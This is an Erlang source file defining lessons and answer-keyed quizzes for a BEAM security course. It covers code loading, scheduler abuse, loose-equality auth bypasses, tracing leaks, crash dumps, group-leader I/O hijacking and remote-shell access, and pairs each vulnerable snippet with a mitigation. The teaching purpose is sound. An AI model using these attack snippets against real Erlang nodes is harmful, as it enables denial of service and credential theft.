                            "Scanning dependencies for parse_transform declarations "
                            "helps identify compile-time code execution. Review any "
                            "matches carefully before compiling."
                        >>
                    }
                ]
            }
        ],
        quiz => [
            #{
                id => <<"code_q1">>,
                type => multiple_choice,
                prompt => <<
                    "What verification does the BEAM VM perform on bytecode "
                    "before loading it?"
                >>,
                options => [
                    #{id => <<"a">>, text => <<"Stack depth and type safety checks">>},
                    #{id => <<"b">>, text => <<"Digital signature verification">>},
                    #{id => <<"c">>, text => <<"SHA-256 checksum validation">>},
                    #{id => <<"d">>, text => <<"None &mdash; it trusts the compiler">>}
                ],
                correct => <<"d">>,
                explanation => <<
                    "The BEAM VM performs no verification pass on loaded bytecode. "
                    "Unlike the JVM, there are no checks for stack depth, type safety, "
                    "or control flow integrity. It operates on a trust-the-compiler model."
                >>
            },
            #{
                id => <<"code_q2">>,
                type => multiple_choice,
                prompt => <<
                    "What happens when a third version of a module is loaded via "
                    "hot code loading?"
                >>,
                options => [
                    #{id => <<"a">>, text => <<"The load fails with an error">>},
                    #{
                        id => <<"b">>,
                        text => <<
                            "Processes running the oldest version are killed"
                        >>
                    },
                    #{id => <<"c">>, text => <<"All three versions coexist">>},
                    #{
                        id => <<"d">>,
                        text => <<"The newest version is queued until processes migrate">>
                    }
                ],
                correct => <<"b">>,
                explanation => <<
                    "The BEAM keeps at most two versions of a module (current and "
                    "old). Loading a third version purges the oldest, and any process "
                    "still executing code from that version is killed by the VM."
                >>
            },
            #{
                id => <<"code_q3">>,
                type => true_false,
                prompt => <<
                    "A malicious parse transform in a dependency can execute "
                    "arbitrary code during compilation, before the application ever runs."
                >>,
                options => [
                    #{id => <<"true">>, text => <<"True">>},
                    #{id => <<"false">>, text => <<"False">>}
                ],
                correct => <<"true">>,
                explanation => <<
                    "True. Parse transforms run at compile time with full access "
                    "to the Erlang runtime. A malicious dependency can use a parse "
                    "transform to execute arbitrary code during rebar3 compile, "
                    "making it a compile-time RCE vector."
                >>
            },
            #{
                id => <<"code_q4">>,
                type => multiple_choice,
                prompt => <<
                    "Which of the following is NOT a recommended mitigation for "
                    "code loading attacks?"
                >>,
                options => [
                    #{
                        id => <<"a">>,
                        text => <<"Verify BEAM file checksums before loading">>
                    },
                    #{
                        id => <<"b">>,
                        text => <<"Encrypt debug info with .erlang.crypt">>
                    },
                    #{
                        id => <<"c">>,
                        text => <<"Audit parse transforms in dependencies">>
                    },
                    #{
                        id => <<"d">>,
                        text => <<"Restrict the code path and use strict file permissions">>
                    }
                ],
                correct => <<"b">>,
                explanation => <<
                    "Encrypting debug info with .erlang.crypt is not a real security "
                    "measure. It uses weak cryptography (DES3 + MD5), stores keys in "
                    "plaintext, and only encrypts the debug_info chunk &mdash; not the "
                    "executable bytecode itself."
                >>
            }
        ]
    }.

scheduling_types_module() ->
    #{
        id => <<"scheduling_types">>,
        number => 10,
        title => <<"Scheduling & Type System Security">>,
        description => <<
            "Explore how the BEAM scheduler and type system can be abused: "
            "priority manipulation, process suspension, reduction count gaming, "
            "loose equality, unbounded data structures, and unrestricted calls."
        >>,
        estimated_minutes => 20,
        sections => [
            #{
                title => <<"Priority Manipulation & Process Suspension">>,
                content => <<
                    "<p>The BEAM scheduler assigns each process a priority level. "
                    "A process running at <code>max</code> priority preempts all "
                    "<code>normal</code> and <code>high</code> priority work. There is "
                    "no built-in rate limiting or capability check &mdash; any process "
                    "can escalate itself.</p>"
                    "<p>Similarly, <code>erlang:suspend_process/2</code> allows any "
                    "process to freeze any other process on the same node, making it a "
                    "targeted denial-of-service primitive.</p>"
                >>,
                code_examples => [
                    #{
                        title => <<"Vulnerable: Starving all normal work">>,
                        code => <<
                            "%% Attacker spawns a max-priority loop\n"
                            "spawn(fun Loop() ->\n"
                            "    process_flag(priority, max),\n"
                            "    heavy_computation(),\n"
                            "    Loop()\n"
                            "end).\n"
                            "%% All normal-priority processes are starved\n"
                            "%% because max preempts everything."
                        >>,
                        vulnerable => true,
                        explanation => <<
                            "A max-priority process preempts all normal and high "
                            "priority work. Without access controls on process_flag/2, "
                            "any code can monopolise the scheduler."
                        >>
                    },
                    #{
                        title => <<"Vulnerable: Targeted process suspension">>,
                        code => <<
                            "%% Suspend a critical process by PID\n"
                            "VictimPid = whereis(payment_processor),\n"
                            "erlang:suspend_process(VictimPid, []).\n"
                            "%% payment_processor is now frozen indefinitely\n"
                            "%% until erlang:resume_process/1 is called."
                        >>,
                        vulnerable => true,
                        explanation => <<
                            "Any process can suspend any other process on the "
                            "same node. There is no permission model. This is a direct "
                            "denial-of-service vector against critical processes."
                        >>
                    },
                    #{
                        title => <<"Mitigation: Sandboxing untrusted code">>,
                        code => <<
                            "%% Run untrusted code in a constrained process\n"
                            "run_sandboxed(Fun) ->\n"
                            "    Ref = make_ref(),\n"
                            "    Parent = self(),\n"
                            "    Pid = spawn(fun() ->\n"
                            "        %% Force normal priority\n"
                            "        process_flag(priority, normal),\n"
                            "        Result = Fun(),\n"
                            "        Parent ! {Ref, Result}\n"
                            "    end),\n"
                            "    %% Monitor and enforce a timeout\n"
                            "    MRef = monitor(process, Pid),\n"
                            "    receive\n"
                            "        {Ref, Result} ->\n"
                            "            demonitor(MRef, [flush]),\n"
                            "            {ok, Result};\n"
                            "        {'DOWN', MRef, _, _, Reason} ->\n"
                            "            {error, Reason}\n"
                            "    after 5000 ->\n"
                            "        exit(Pid, kill),\n"
                            "        demonitor(MRef, [flush]),\n"
                            "        {error, timeout}\n"
                            "    end."
                        >>,
                        vulnerable => false,
                        explanation => <<
                            "While this does not prevent the spawned process from "
                            "re-escalating its priority, the timeout and monitor ensure it "
                            "cannot run indefinitely. True sandboxing requires limiting "
                            "which BIFs untrusted code can call."
                        >>
                    }
                ]
            },
            #{
                title => <<"Reduction Count Gaming">>,
                content => <<
                    "<p>The BEAM scheduler preempts processes based on "
                    "<strong>reduction counts</strong>, not wall-clock time. However, "
                    "not all operations cost the same number of reductions:</p>"
                    "<ul>"
                    "<li>A long-running NIF or BIF may consume significant wall-clock "
                    "time while only counting as a few reductions</li>"
                    "<li>Crypto operations, large binary manipulations, and regex "
                    "matching are common examples</li>"
                    "<li>This means a single process can monopolise a scheduler thread "
                    "for far longer than expected</li>"
                    "</ul>"
                    "<p>NIF authors should use <code>enif_schedule_nif</code> or "
                    "<code>enif_consume_timeslice</code> to yield cooperatively.</p>"
                >>,
                code_examples => [
                    #{
                        title => <<"Reduction cost disparity">>,
                        code => <<
                            "%% A simple loop: ~1 reduction per iteration\n"
                            "count(0) -> done;\n"
                            "count(N) -> count(N - 1).\n\n"
                            "%% A crypto call: few reductions, lots of wall-clock\n"
                            "heavy_hash(Data) ->\n"
                            "    %% This may count as ~1 reduction but take\n"
                            "    %% milliseconds of real CPU time\n"
                            "    crypto:hash(sha256, Data)."
                        >>,
                        vulnerable => false,
                        explanation => <<
                            "The scheduler sees both as roughly equal cost in "
                            "reductions, but crypto:hash may hold the scheduler thread "
                            "far longer. NIF-heavy workloads can cause latency spikes "
                            "for co-scheduled processes."
                        >>
                    }
                ]
            },
            #{
                title => <<"Equality Confusion & Auth Bypasses">>,
                content => <<
                    "<p>Erlang has two equality operators with different semantics:</p>"
                    "<ul>"
                    "<li><code>==</code> &mdash; structural equality with numeric coercion: "
                    "<code>1 == 1.0</code> is <code>true</code></li>"
                    "<li><code>=:=</code> &mdash; exact equality: "
                    "<code>1 =:= 1.0</code> is <code>false</code></li>"
                    "</ul>"
                    "<p>Using <code>==</code> in security-critical comparisons (user IDs, "
                    "tokens, permissions) can allow unintended matches. An integer user "
                    "ID compared with <code>==</code> will match a float representation "
                    "of the same number.</p>"
                    "<p><strong>Rule:</strong> always use <code>=:=</code> for "
                    "security-critical comparisons.</p>"
                >>,
                code_examples => [
                    #{
                        title => <<"Vulnerable: Loose equality in auth check">>,
                        code => <<
                            "is_admin(UserId, AdminId) ->\n"
                            "    %% DANGEROUS: 1 == 1.0 is true\n"
                            "    UserId == AdminId.\n\n"
                            "%% Attacker sends user_id as 1.0 (float)\n"
                            "%% Admin ID is 1 (integer)\n"
                            "is_admin(1.0, 1).\n"
                            "%% => true (authentication bypass!)"
                        >>,
                        vulnerable => true,
                        explanation => <<
                            "The == operator coerces numeric types, so 1 == 1.0 "
                            "returns true. If an attacker controls the type of the input "
                            "(e.g., via JSON where 1.0 decodes as float), they may bypass "
                            "identity checks."
                        >>,
                        output => <<"true">>
                    },
                    #{
                        title => <<"Safe: Exact equality">>,
                        code => <<
                            "is_admin(UserId, AdminId) ->\n"
                            "    %% SAFE: 1 =:= 1.0 is false\n"
                            "    UserId =:= AdminId.\n\n"
                            "is_admin(1.0, 1).\n"
                            "%% => false (correctly rejected)"
                        >>,
                        vulnerable => false,
                        explanation => <<
                            "The =:= operator requires both value and type to "
                            "match. This prevents numeric coercion from bypassing "
                            "identity comparisons."
                        >>,
                        output => <<"false">>
                    }
                ]
            },
            #{
                title => <<"Unbounded Data & Unrestricted Calls">>,
                content => <<
                    "<p>The BEAM VM does not enforce size limits on data structures "
                    "or restrict which functions a process can call:</p>"
                    "<ul>"
                    "<li><strong>Unbounded lists</strong> &mdash; a list built from "
                    "untrusted input can grow without limit, exhausting memory</li>"
                    "<li><strong>Unbounded bignums</strong> &mdash; Erlang integers have "
                    "arbitrary precision. A malicious input like "
                    "<code>math:pow(2, 1000000)</code> allocates enormous terms</li>"
                    "<li><strong>String-as-list overhead</strong> &mdash; on 64-bit systems, "
                    "each character in a list-string costs 16 bytes (one word for the "
                    "value, one for the list cell pointer). A 1 MB UTF-8 binary becomes "
                    "~16 MB as a list &mdash; a 16x amplification</li>"
                    "<li><strong>Unrestricted external calls</strong> &mdash; the "
                    "<code>call_ext</code> BEAM instruction can invoke any "
                    "<code>Module:Function/Arity</code>. There is no capability system "
                    "or access control at the VM level</li>"
                    "</ul>"
                >>,
                code_examples => [
                    #{
                        title => <<"Vulnerable: Unbounded list from input">>,
                        code => <<
                            "parse_items(JsonArray) ->\n"
                            "    %% No size limit on input\n"
                            "    [process_item(I) || I <- JsonArray].\n\n"
                            "%% Attacker sends a JSON array with 10 million elements\n"
                            "%% => Out of memory"
                        >>,
                        vulnerable => true,
                        explanation => <<
                            "Without size validation, untrusted input can produce "
                            "arbitrarily large lists. Always validate collection sizes "
                            "before processing."
                        >>
                    },
                    #{
                        title => <<"Safe: Bounded input with binary strings">>,
                        code => <<
                            "-define(MAX_ITEMS, 1000).\n\n"
                            "parse_items(JsonArray) when length(JsonArray) > ?MAX_ITEMS ->\n"
                            "    {error, too_many_items};\n"
                            "parse_items(JsonArray) ->\n"
                            "    {ok, [process_item(I) || I <- JsonArray]}.\n\n"
                            "%% Use binaries instead of list-strings\n"
                            "%% <<\"hello\">> = 5 bytes\n"
                            "%% \"hello\" as list = 80 bytes (16 bytes/char on 64-bit)"
                        >>,
                        vulnerable => false,
                        explanation => <<
                            "Enforce size limits on all collections from untrusted "
                            "input. Prefer binaries over list-strings to avoid the 16x "
                            "memory amplification."
                        >>
                    }
                ]
            }
        ],
        quiz => [
            #{
                id => <<"sched_q1">>,
                type => multiple_choice,
                prompt => <<
                    "What happens when a process calls "
                    "process_flag(priority, max)?"
                >>,
                options => [
                    #{id => <<"a">>, text => <<"It gets slightly more CPU time">>},
                    #{
                        id => <<"b">>,
                        text => <<"It preempts all normal and high priority processes">>
                    },
                    #{id => <<"c">>, text => <<"It requires supervisor approval">>},
                    #{id => <<"d">>, text => <<"It only affects the current scheduler thread">>}
                ],
                correct => <<"b">>,
                explanation => <<
                    "Max priority processes are always scheduled before normal "
                    "and high priority processes. There is no rate limiting or permission "
                    "check, so a max-priority busy loop can starve all other work on the node."
                >>
            },
            #{
                id => <<"sched_q2">>,
                type => multiple_choice,
                prompt => <<
                    "Why can a NIF-heavy process monopolise a scheduler thread "
                    "despite the reduction-based preemption model?"
                >>,
                options => [
                    #{id => <<"a">>, text => <<"NIFs disable the scheduler">>},
                    #{
                        id => <<"b">>,
                        text => <<
                            "NIFs may consume significant wall-clock time "
                            "while counting as very few reductions"
                        >>
                    },
                    #{id => <<"c">>, text => <<"NIFs run in a separate OS thread">>},
                    #{id => <<"d">>, text => <<"NIFs have max priority by default">>}
                ],
                correct => <<"b">>,
                explanation => <<
                    "The scheduler preempts based on reduction counts, not "
                    "wall-clock time. A long-running NIF or BIF may only register a few "
                    "reductions while holding the scheduler thread for milliseconds. "
                    "NIF authors should use enif_consume_timeslice to yield cooperatively."
                >>
            },
            #{
                id => <<"sched_q3">>,
                type => multiple_choice,
                prompt => <<
                    "Why is using == instead of =:= dangerous in authentication logic?"
                >>,
                options => [
                    #{id => <<"a">>, text => <<"== is slower than =:=">>},
                    #{
                        id => <<"b">>,
                        text => <<
                            "== coerces numeric types, so 1 == 1.0 is true, "
                            "potentially bypassing identity checks"
                        >>
                    },
                    #{id => <<"c">>, text => <<"== does not work with binaries">>},
                    #{id => <<"d">>, text => <<"== raises an exception on type mismatch">>}
                ],
                correct => <<"b">>,
                explanation => <<
                    "The == operator performs numeric coercion: 1 == 1.0 returns "
                    "true. If an attacker can control the type of a value (e.g., sending "
                    "a float via JSON), they may pass identity checks that compare user "
                    "IDs or tokens. Always use =:= for security-critical comparisons."
                >>
            },
            #{
                id => <<"sched_q4">>,
                type => true_false,
                prompt => <<
                    "On a 64-bit BEAM, a list-string uses approximately 16 bytes "
                    "per character compared to 1 byte per character in a UTF-8 binary."
                >>,
                options => [
                    #{id => <<"true">>, text => <<"True">>},
                    #{id => <<"false">>, text => <<"False">>}
                ],
                correct => <<"true">>,
                explanation => <<
                    "Each element in an Erlang list requires two words: one for "
                    "the value and one for the list cell pointer. On a 64-bit system "
                    "that is 16 bytes per character, compared to 1 byte per character in "
                    "a UTF-8 binary. This 16x amplification makes list-strings dangerous "
                    "when processing untrusted input of unknown size."
                >>
            }
        ]
    }.

introspection_module() ->
    #{
        id => <<"introspection">>,
        number => 11,
        title => <<"Introspection & Information Disclosure">>,
        description => <<
            "Learn how Erlang's powerful introspection and debugging tools "
            "can leak secrets, crash production nodes, and give attackers "
            "full control. Covers tracing, crash dumps, I/O hijacking, "
            "and remote shell risks."
        >>,
        estimated_minutes => 20,
        sections => [
            #{
                title => <<"Tracing Dangers">>,
                content => <<
                    "<p>Erlang's tracing infrastructure is a powerful debugging tool, "
                    "but it becomes a serious threat in production.</p>"
                    "<ul>"
                    "<li><strong>Trace overload DoS</strong> &mdash; broad "
                    "<code>erlang:trace/3</code> patterns with no rate limiting generate "
                    "enormous output volumes that overwhelm the node, causing it to "
                    "become unresponsive or crash.</li>"
                    "<li><strong>Information disclosure</strong> &mdash; traces capture "
                    "function arguments and return values. This means passwords, API tokens, "
                    "encryption keys, and session secrets are all visible in trace output.</li>"
                    "<li><strong>The dbg module</strong> &mdash; <code>dbg</code> makes "
                    "tracing trivially easy, which is exactly why it is dangerous in "
                    "production. A single <code>dbg:tp</code> call with a broad match "
                    "spec can bring down a busy node.</li>"
                    "</ul>"
                >>,
                code_examples => [
                    #{
                        title => <<"Vulnerable: broad trace pattern in production">>,
                        code => <<
                            "%% DANGEROUS: traces ALL calls to ALL functions\n"
                            "%% in the my_auth module, including login/2\n"
                            "dbg:tracer(),\n"
                            "dbg:tp(my_auth, []),\n"
                            "dbg:p(all, c).\n\n"
                            "%% Trace output exposes secrets:\n"
                            "%% (<0.500.0>) call my_auth:login(\n"
                            "%%   <<\"admin\">>,\n"
                            "%%   <<\"s3cret_passw0rd\">>)\n"
                            "%% (<0.500.0>) returned <<\"eyJhbGciOi...\">>"
                        >>,
                        vulnerable => true,
                        explanation => <<
                            "Tracing my_auth captures every call including "
                            "login credentials and returned JWT tokens. On a busy "
                            "system, tracing all processes also floods the tracer "
                            "process with messages, risking a node crash."
                        >>,
                        output => <<
                            "(<0.500.0>) call my_auth:login(<<\"admin\">>, <<\"s3cret\">>)\n"
                            "(<0.500.0>) returned <<\"eyJhbGciOiJIUzI1NiIs...\">>"
                        >>
                    },
                    #{
                        title => <<"Safer: rate-limited tracing with redaction">>,
                        code => <<
                            "%% Use a custom tracer that rate-limits and redacts\n"
                            "safe_trace(Module, Function, Arity) ->\n"
                            "    MaxMsgs = 1000,\n"
                            "    Tracer = spawn(fun() -> trace_loop(MaxMsgs) end),\n"
                            "    erlang:trace(all, true, [{tracer, Tracer}, call]),\n"
                            "    erlang:trace_pattern(\n"
                            "        {Module, Function, Arity},\n"
                            "        [{'_', [], [{return_trace}]}],\n"
                            "        [local]\n"
                            "    ).\n\n"
                            "trace_loop(0) ->\n"
                            "    erlang:trace(all, false, [call]),\n"
                            "    io:format(\"Trace limit reached, stopping.~n\");\n"
                            "trace_loop(N) ->\n"
                            "    receive\n"
                            "        Msg ->\n"
                            "            io:format(\"~p~n\", [redact(Msg)]),\n"
                            "            trace_loop(N - 1)\n"
                            "    after 5000 ->\n"
                            "        erlang:trace(all, false, [call]),\n"
                            "        io:format(\"Trace timed out, stopping.~n\")\n"
                            "    end."
                        >>,
                        vulnerable => false,
                        explanation => <<
                            "A custom tracer process with a message limit and "
                            "timeout prevents trace overload. The redact/1 function "
                            "(not shown) should scrub sensitive arguments before "
                            "output. Always trace specific MFAs, never broad patterns."
                        >>,
                        output => <<"Trace limit reached, stopping.">>
                    }
                ]
            },
            #{
                title => <<"Crash Dumps & Debugging Tools">>,
                content => <<
                    "<p>Erlang crash dumps and debugging tools are full-disclosure "
                    "mechanisms that expose the entire runtime state.</p>"
                    "<ul>"
                    "<li><strong>Crash dumps</strong> &mdash; written to "
                    "<code>erl_crash.dump</code> by default. They contain process heaps "
                    "(with all in-memory data), message queues, ETS table metadata, "
                    "and full system configuration. Anyone who can read the file sees "
                    "every secret the node held at crash time.</li>"
                    "<li><strong>GDB attachment</strong> &mdash; attaching a debugger to "
                    "the BEAM process allows raw memory inspection. Crypto keys, session "
                    "tokens, and passwords stored in process heaps or ETS are directly "
                    "readable.</li>"
                    "<li><strong>Observer</strong> &mdash; the Observer GUI exposes "
                    "process state, message queues, ETS table contents, and application "
                    "structure. Anyone with shell access to the node can inspect "
                    "everything.</li>"
                    "</ul>"
                >>,
                code_examples => [
                    #{
                        title => <<"Vulnerable: secrets visible in crash dump">>,
                        code => <<
                            "-module(my_session).\n"
                            "-behaviour(gen_server).\n\n"
                            "%% State holds plaintext secrets\n"
                            "init([]) ->\n"
                            "    {ok, #{api_key => <<\"sk-live-abc123def456\">>,\n"
                            "           db_password => <<\"hunter2\">>,\n"
                            "           sessions => #{}}}.\n\n"
                            "%% If this process crashes, the crash dump contains\n"
                            "%% the full state map including api_key and db_password.\n"
                            "%% $ grep -a 'sk-live' erl_crash.dump\n"
                            "%% sk-live-abc123def456"
                        >>,
                        vulnerable => true,
                        explanation => <<
                            "Any secret held in process state appears in crash "
                            "dumps. Crash dumps are plaintext files with no access "
                            "control beyond filesystem permissions."
                        >>,
                        output => <<
                            "=proc:<0.200.0>\n"
                            "State: #{api_key => <<\"sk-live-abc123def456\">>, ...}"
                        >>
                    },
                    #{
                        title => <<"Safer: restrict crash dump location">>,
                        code => <<
                            "%% In vm.args or sys.config:\n"
                            "%% Point crash dumps to a restricted directory\n"
                            "%% +env ERL_CRASH_DUMP /var/log/erlang/crash.dump\n\n"
                            "%% Set restrictive permissions on the directory\n"
                            "%% $ mkdir -p /var/log/erlang\n"
                            "%% $ chmod 700 /var/log/erlang\n"
                            "%% $ chown app_user:app_user /var/log/erlang\n\n"
                            "%% Alternatively, disable crash dumps entirely:\n"
                            "%% +env ERL_CRASH_DUMP /dev/null\n\n"
                            "%% Keep secrets out of process state where possible.\n"
                            "%% Use short-lived lookups instead:\n"
                            "get_api_key() ->\n"
                            "    {ok, Key} = application:get_env(myapp, api_key),\n"
                            "    Key.\n"
                            "%% (Note: app env is also in the dump, but this\n"
                            "%% reduces the number of copies in memory.)"
                        >>,
                        vulnerable => false,
                        explanation => <<
                            "Restrict crash dump file permissions or redirect "
                            "to /dev/null. Minimise the number of processes holding "
                            "long-lived copies of secrets. Neither approach is "
                            "perfect, but both reduce exposure."
                        >>,
                        output => <<"ok">>
                    }
                ]
            },
            #{
                title => <<"I/O System Attacks">>,
                content => <<
                    "<p>Erlang's I/O system routes output through <strong>group leader</strong> "
                    "processes. This indirection creates an attack surface.</p>"
                    "<ul>"
                    "<li><strong>Group leader hijacking</strong> &mdash; calling "
                    "<code>group_leader(EvilPid, TargetPid)</code> redirects all I/O output "
                    "from the target process to a process the attacker controls. This "
                    "intercepts <code>io:format</code>, <code>logger</code> output, and any "
                    "other I/O operation &mdash; including output that may contain secrets.</li>"
                    "<li><strong>erlang:display/1</strong> &mdash; this BIF bypasses the "
                    "group leader entirely, writing directly to standard output. It can leak "
                    "information past any I/O interception defenses. It also cannot be "
                    "suppressed by group leader redirection.</li>"
                    "</ul>"
                >>,
                code_examples => [
                    #{
                        title => <<"Vulnerable: group leader hijacking">>,
                        code => <<
                            "%% Attacker spawns a process that captures all I/O\n"
                            "Spy = spawn(fun() -> spy_loop([]) end),\n\n"
                            "%% Redirect the target's I/O to the spy\n"
                            "group_leader(Spy, TargetPid),\n\n"
                            "%% Now when TargetPid does:\n"
                            "%%   io:format(\"Token: ~s~n\", [Token])\n"
                            "%% the output goes to Spy, not the console.\n\n"
                            "spy_loop(Captured) ->\n"
                            "    receive\n"
                            "        {io_request, From, ReplyAs, Request} ->\n"
                            "            From ! {io_reply, ReplyAs, ok},\n"
                            "            spy_loop([Request | Captured]);\n"
                            "        {get_captured, Pid} ->\n"
                            "            Pid ! {captured, lists:reverse(Captured)}\n"
                            "    end."
                        >>,
                        vulnerable => true,
                        explanation => <<
                            "group_leader/2 requires no special privileges. Any "
                            "code running on the node can redirect another process's "
                            "I/O output. All io:format calls, including those logging "
                            "tokens or credentials, are silently captured."
                        >>,
                        output => <<
                            "{captured, [{put_chars, unicode,\n"
                            "  <<\"Token: eyJhbGciOi...\">>}]}"
                        >>
                    },
                    #{
                        title => <<"erlang:display/1 bypasses group leaders">>,
                        code => <<
                            "%% erlang:display/1 writes directly to fd 2 (stderr),\n"
                            "%% completely bypassing the group leader.\n\n"
                            "%% Even if group_leader is set to a spy process:\n"
                            "group_leader(Spy, self()),\n\n"
                            "%% This still goes to the real stderr:\n"
                            "erlang:display({secret, <<\"api_key_here\">>}).\n\n"
                            "%% Output appears on the console/stderr regardless\n"
                            "%% of group leader settings. This can leak secrets\n"
                            "%% that were meant to be captured or suppressed."
                        >>,
                        vulnerable => true,
                        explanation => <<
                            "erlang:display/1 is a BIF that writes directly to "
                            "stderr. It cannot be intercepted via group leader "
                            "redirection. If used with sensitive data, it leaks "
                            "information to anyone who can read the process's stderr."
                        >>,
                        output => <<"{secret,<<\"api_key_here\">>}">>
                    }
                ]
            },
            #{
                title => <<"Operational Security">>,
                content => <<
                    "<p>Several operational features of the BEAM give unrestricted "
                    "access to anyone who can reach them.</p>"
                    "<ul>"
                    "<li><strong>Remote shell (remsh)</strong> &mdash; connecting via "
                    "<code>erl -remsh node@host</code> gives full Erlang shell access. "
                    "Any connected user can run any code, read any data, and modify any "
                    "state. This is game over for security.</li>"
                    "<li><strong>run_erl/to_erl pipes</strong> &mdash; these provide shell "
                    "access through named pipes in the filesystem. Protection is limited "
                    "to filesystem permissions on the pipe directory.</li>"
                    "<li><strong>BREAK mode (Ctrl+C)</strong> &mdash; pressing Ctrl+C "
                    "opens the BREAK menu which can halt the entire production node. "
                    "Use the <code>+Bi</code> flag to ignore BREAK signals.</li>"
                    "</ul>"
                    "<p><strong>Safe patterns:</strong></p>"
                    "<ul>"
                    "<li>Disable remote shell in production or restrict via firewall rules</li>"
                    "<li>Start the VM with <code>+Bi</code> to disable BREAK mode</li>"
                    "<li>Restrict crash dump file location and permissions</li>"
                    "<li>Use structured logging instead of <code>io:format</code> with secrets</li>"
                    "<li>Audit all trace usage in production code and scripts</li>"
                    "</ul>"
                >>,
                code_examples => [
                    #{
                        title => <<"Vulnerable: remote shell with no restrictions">>,
                        code => <<
                            "%% Starting a node with default settings\n"
                            "%% erl -name prod@10.0.0.1 -setcookie mycookie\n\n"
                            "%% Anyone who knows the cookie can connect:\n"
                            "%% erl -name attacker@10.0.0.2 -setcookie mycookie \\\n"
                            "%%     -remsh prod@10.0.0.1\n\n"
                            "%% Once connected, full access:\n"
                            "application:get_all_env(myapp).\n"
                            "%% => [{db_password, \"hunter2\"},\n"
                            "%%     {api_key, \"sk-live-abc123\"},\n"
                            "%%     ...]"
                        >>,
                        vulnerable => true,
                        explanation => <<
                            "The Erlang cookie is the only authentication for "
                            "remote shell access. If an attacker obtains the cookie "
                            "(from a config file, environment variable, or crash dump), "
                            "they have full control of the node."
                        >>,
                        output => <<
                            "[{db_password, \"hunter2\"}, {api_key, \"sk-live-abc123\"}]"
                        >>
                    },
                    #{
                        title => <<"Safer: hardened production VM flags">>,
                        code => <<
                            "%% vm.args for a hardened production node:\n"
                            "%%\n"
                            "%% Ignore BREAK signal (Ctrl+C cannot halt the node)\n"
                            "%% +Bi\n"
                            "%%\n"
                            "%% Crash dump to restricted location\n"
                            "%% +env ERL_CRASH_DUMP /var/log/erlang/crash.dump\n"
                            "%%\n"
                            "%% Use a long, random cookie\n"
                            "%% -setcookie aeRk8ahw...(64+ random chars)\n"
                            "%%\n"
                            "%% Restrict distribution to specific interface\n"
                            "%% -kernel inet_dist_use_interface {127,0,0,1}\n"
                            "%%\n"
                            "%% Or disable distribution entirely if not needed:\n"
                            "%% -sname nonode -noinput -noshell\n\n"
                            "%% Use structured logging, never io:format with secrets\n"
                            "log_auth_event(UserId, Result) ->\n"
                            "    logger:info(#{event => auth,\n"
                            "                  user_id => UserId,\n"
                            "                  result => Result}).\n"
                            "    %% Never: io:format(\"Login ~s with password ~s~n\", ...)"
                        >>,
                        vulnerable => false,
                        explanation => <<
                            "The +Bi flag prevents BREAK mode from halting the "
                            "node. Restricting the distribution interface or disabling "
                            "distribution entirely prevents remote shell connections. "
                            "Structured logging avoids accidentally including secrets "
                            "in output strings."
                        >>,
                        output => <<"ok">>
                    }
                ]
            }
        ],
        quiz => [
            #{
                id => <<"introspect_q1">>,
                type => multiple_choice,
                prompt => <<
                    "What is the primary risk of using dbg:tp/2 with a broad "
                    "match pattern on a production node?"
                >>,
                options => [
                    #{id => <<"a">>, text => <<"It only traces the first 10 calls">>},
                    #{
                        id => <<"b">>,
                        text => <<
                            "It can overload the node with trace output and expose "
                            "sensitive data in function arguments"
                        >>
                    },
                    #{id => <<"c">>, text => <<"It requires root privileges to run">>},
                    #{id => <<"d">>, text => <<"It automatically redacts passwords">>}
                ],
                correct => <<"b">>,
                explanation => <<
                    "Broad trace patterns generate a message for every matching "
                    "function call. On a busy node this can overwhelm the tracer "
                    "process and cause a crash. The trace output includes all "
                    "function arguments and return values, exposing passwords, "
                    "tokens, and other secrets."
                >>
            },
            #{
                id => <<"introspect_q2">>,
                type => true_false,
                prompt => <<
                    "An Erlang crash dump only contains the stack traces of "
                    "crashed processes, not the contents of process heaps or "
                    "ETS tables."
                >>,
                options => [
                    #{id => <<"true">>, text => <<"True">>},
                    #{id => <<"false">>, text => <<"False">>}
                ],
                correct => <<"false">>,
                explanation => <<
                    "Crash dumps contain process heaps (all in-memory data), "
                    "message queues, ETS table metadata, and full system "
                    "configuration. They are a full-disclosure mechanism that "
                    "exposes every secret the node held at crash time."
                >>
            },
            #{
                id => <<"introspect_q3">>,
                type => multiple_choice,
                prompt => <<
                    "What does calling group_leader(EvilPid, TargetPid) accomplish?"
                >>,
                options => [
                    #{id => <<"a">>, text => <<"Kills the target process">>},
                    #{
                        id => <<"b">>,
                        text => <<
                            "Redirects all I/O output from the target process "
                            "to the attacker-controlled process"
                        >>
                    },
                    #{id => <<"c">>, text => <<"Grants the target process supervisor privileges">>},
                    #{id => <<"d">>, text => <<"Changes the target process's registered name">>}
                ],
                correct => <<"b">>,
                explanation => <<
                    "group_leader/2 sets the group leader of a process. All "
                    "I/O operations (io:format, logger output, etc.) are routed "
                    "through the group leader. By setting it to an "
                    "attacker-controlled process, all I/O output including "
                    "logged secrets is silently captured."
                >>
            },
            #{
                id => <<"introspect_q4">>,
                type => multiple_choice,
                prompt => <<
                    "Which VM flag prevents the BREAK menu (Ctrl+C) from "
                    "halting a production node?"
                >>,
                options => [
                    #{id => <<"a">>, text => <<"+Bd">>},
                    #{id => <<"b">>, text => <<"+Bi">>},
                    #{id => <<"c">>, text => <<"-noshell">>},
                    #{id => <<"d">>, text => <<"-detached">>}
                ],
                correct => <<"b">>,
                explanation => <<
                    "The +Bi flag causes the runtime to ignore the BREAK "
                    "signal. Without it, pressing Ctrl+C opens a menu that "
                    "can immediately halt the node. The -noshell and -detached "
                    "flags also prevent interactive BREAK, but +Bi is the "
                    "explicit flag for ignoring the signal."
                >>
            }
        ]
    }.

web_security_module() ->
    #{
        id => <<"web_security">>,
        number => 12,
        title => <<"Web Security for Erlang">>,
        description => <<
            "Learn how to defend Erlang web applications against XSS, CSRF, "
            "WebSocket hijacking, file upload attacks, and port-blocking denial "
            "of service. Covers secure HTTP headers, session management, and "
            "input validation patterns for Cowboy-based services."
        >>,
        estimated_minutes => 25,
        sections => [
            #{
                title => <<"XSS Prevention">>,
                content => <<
                    "<p>Cross-site scripting (XSS) occurs when user-supplied data is "
                    "rendered into HTML without escaping. An attacker injects a "
                    "<code>&lt;script&gt;</code> tag and executes arbitrary JavaScript "
                    "in other users' browsers.</p>"
                    "<p>In Erlang, HTML is often built with iolists. Every piece of user "
                    "data inserted into an iolist must be HTML-escaped first. Template "
                    "engines like ErlyDTL auto-escape by default, but raw iolist "
                    "construction does not.</p>"
                    "<p>Additionally, set a <strong>Content-Security-Policy</strong> header "
                    "to restrict which scripts the browser will execute, providing defence "
                    "in depth even if an escaping bug slips through.</p>"
                >>,
